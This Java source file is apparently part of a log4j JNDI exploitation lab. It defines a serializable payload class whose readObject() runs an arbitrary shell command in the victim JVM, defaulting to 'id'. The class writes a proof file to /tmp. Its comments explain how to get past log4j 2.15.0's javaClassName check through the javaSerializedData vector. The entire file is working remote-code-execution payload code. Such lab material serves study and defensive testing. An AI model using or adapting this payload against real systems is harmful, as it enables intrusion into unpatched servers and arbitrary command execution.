package lab;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.management.ManagementFactory;
import java.nio.charset.Charset;

/**
 * Payload for the javaSerializedData vector: JNDI deserializes whatever bytes the LDAP
 * server returns. Its readObject() runs inside the victim JVM.
 *
 * The attacker serializes an instance of this class and advertises a *different*
 * javaClassName in the LDAP entry, which is what log4j 2.15.0 checks.
 */
public final class Serial implements java.io.Serializable {

    private static final long serialVersionUID = 1L;

    private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        final String cmd = System.getProperty("lab.cmd", "id");
        final StringBuilder out = new StringBuilder();
        try {
            final Process p = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});
            final java.io.BufferedReader r = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream(), Charset.forName("UTF-8")));
            String line;
            while ((line = r.readLine()) != null) {
                out.append(line).append('\n');
            }
            p.waitFor();
        } catch (Throwable t) {
            out.append("payload error: ").append(t).append('\n');
        }
        final String proof = "RCE via log4j JNDI (javaSerializedData) in "
                + ManagementFactory.getRuntimeMXBean().getName()
                + "\ncmd: " + cmd
                + "\noutput:\n" + out;
        try {
            final FileOutputStream fos = new FileOutputStream(
                    System.getProperty("lab.proof", "/tmp/log4j-lab-pwned.txt"));
            try {
                fos.write(proof.getBytes(Charset.forName("UTF-8")));
            } finally {
                fos.close();
            }
        } catch (Throwable ignored) {
            // best effort
        }
        System.out.println("=== PAYLOAD EXECUTED IN VICTIM JVM (javaSerializedData) ===");
        System.out.print(proof);
        System.out.println("=== END PAYLOAD ===");
    }

    /** Used by the attacker to produce the serialized bytes. */
    public static byte[] serialize() throws IOException {
        final java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        final ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(new Serial());
        out.flush();
        out.close();
        return bos.toByteArray();
    }
}
